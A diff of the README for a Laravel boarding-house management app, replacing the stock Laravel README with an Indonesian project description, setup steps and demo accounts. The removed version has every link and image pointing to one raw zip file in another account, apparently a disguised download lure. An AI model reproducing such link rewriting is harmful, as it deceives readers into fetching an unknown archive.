@@ -1,59 +1,91 @@
-<p align="center"><a href="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip" width="400" alt="Laravel Logo"></a></p>
+# Sewa Kos - Aplikasi Manajemen Kos
 
-<p align="center">
-<a href="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip"><img src="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
-</p>
+Aplikasi manajemen dan penyewaan kamar kos berbasis Laravel. Proyek ini mempermudah pemilik kos (Admin), petugas operasional (Pegawai), dan penyewa (Penyewa) dalam melakukan transaksi, pelaporan keluhan, pelayanan, dan administrasi harian.
 
-## About Laravel
+---
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
+## 👥 Peran Pengguna (User Roles)
 
-- [Simple, fast routing engine](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
-- [Powerful dependency injection container](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
-- Multiple back-ends for [session](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip) and [cache](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip) storage.
-- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
-- Database agnostic [schema migrations](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
-- [Robust background job processing](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
-- [Real-time event broadcasting](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
+Aplikasi memiliki 3 peran pengguna utama yang diatur dalam database:
 
-Laravel is accessible, powerful, and provides tools required for large, robust applications.
+### 1. Admin
+*   **Dashboard Utama**: Statistik keuangan, properti, pesanan, dan pengguna.
+*   **Manajemen Properti**: CRUD kamar dan tipe kamar kos.
+*   **Manajemen Layanan**: CRUD layanan tambahan (Catering, Laundry, Cleaning Service).
+*   **Manajemen Akun**: CRUD data pengguna (Penyewa dan Pegawai).
+*   **Penugasan Layanan (Assign Task)**: Mendelegasikan pemesanan layanan tambahan dari penyewa ke Pegawai operasional.
+*   **Laporan Masalah**: Memverifikasi dan meneruskan keluhan fasilitas dari penyewa ke Pegawai pelaksana.
 
-## Learning Laravel
+### 2. Pegawai (Staf Operasional) `[NEW]`
+*   **Dashboard Analitik**: Melihat rangkuman tugas aktif dan laporan kerusakan yang didelegasikan.
+*   **Tugas Layanan (My Tasks)**:
+    *   Melihat daftar pesanan layanan tambahan kamar (laundry, catering, dll) yang harus dikerjakan.
+    *   Filter status pekerjaan (Semua, Belum Dikerjakan, Sedang Dikerjakan, Selesai).
+    *   Mengubah status tugas secara real-time (`Mulai` / `Selesai`).
+*   **Laporan Kerusakan (Maintenance Requests)**:
+    *   Melihat komplain kerusakan fasilitas kamar yang ditugaskan oleh Admin.
+    *   Melihat detail keluhan, lokasi kamar, pelapor, dan foto bukti masalah (dengan popup zoomable modal).
+    *   Filter status komplain.
+    *   Mengubah status penanganan kerusakan (`Proses` / `Selesai`).
+*   **Profil Saya**: Memperbarui informasi personal pegawai (Nama, Email, No. HP, Jenis Kelamin, Tanggal Lahir) serta opsi mengganti kata sandi.
 
-Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework. You can also check out [Laravel Learn](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip), where you will be guided through building a modern Laravel application.
+### 3. Penyewa
+*   **Eksplorasi Kamar**: Pencarian dan filter kamar berdasarkan fasilitas atau harga.
+*   **Pemesanan**: Reservasi kamar kos online dengan opsi integrasi pembayaran Midtrans.
+*   **Keluhan (Report)**: Mengajukan komplain kerusakan fasilitas kamar dengan deskripsi dan foto bukti.
+*   **Layanan Tambahan**: Menambahkan pemesanan catering, laundry, atau cleaning service ke kamar.
+*   **Profil & Verifikasi**: Mengunggah foto KTP dan selfie untuk verifikasi identitas (KYC).
 
-If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+---
 
-## Laravel Sponsors
+## 🛠️ Tech Stack & Integrasi
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
+*   **Backend**: Laravel 12 (PHP 8.4)
+*   **Frontend**: Blade Templates, Tailwind CSS (via CDN), Font Awesome 6
+*   **Database**: SQLite / MySQL (dengan Eloquent ORM & Query Scopes)
+*   **Pembayaran**: Midtrans Payment Gateway integration
+*   **Testing**: Pest Framework / PHPUnit
 
-### Premium Partners
+---
 
-- **[Vehikl](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[Tighten Co.](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[64 Robots](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[Curotec](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[DevSquad](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[Redberry](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
-- **[Active Logic](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip)**
+## 🚀 Cara Menjalankan Project & Seeder Pegawai
 
-## Contributing
+1.  **Clone repositori & Install dependensi**:
+    ```bash
+    git clone https://github.com/mraynar/sewa-kos.git
+    cd sewa-kos
+    composer install
+    npm install
+    ```
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
+2.  **Konfigurasi Environment**:
+    Salin file `.env.example` ke `.env` dan konfigurasikan database serta kredensial Midtrans Anda.
 
-## Code of Conduct
+3.  **Migrasi & Seed Awal**:
+    ```bash
+    php artisan migrate --seed
+    ```
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
+4.  **Seed Data Demo Pegawai Baru**:
+    Jalankan seeder khusus untuk membuat 2 akun staf pegawai operasional baru untuk uji coba:
+    ```bash
+    php artisan db:seed --class=PegawaiSeeder
+    ```
+    Akun demo pegawai yang dibuat:
+    *   **Pegawai 1**: `budi@gmail.com` (password: `password`)
+    *   **Pegawai 2**: `ani@gmail.com` (password: `password`)
 
-## Security Vulnerabilities
+5.  **Jalankan Server Lokal**:
+    ```bash
+    php artisan serve
+    npm run dev
+    ```
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+---
 
-## License
+## 🧪 Pengujian (Testing)
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Kinnarasarp/sewa-kos/main/bootstrap/kos_sewa_v3.8.zip).
+Jalankan rangkaian pengujian otomatis dengan Pest/PHPUnit menggunakan perintah:
+```bash
+php artisan test
+```
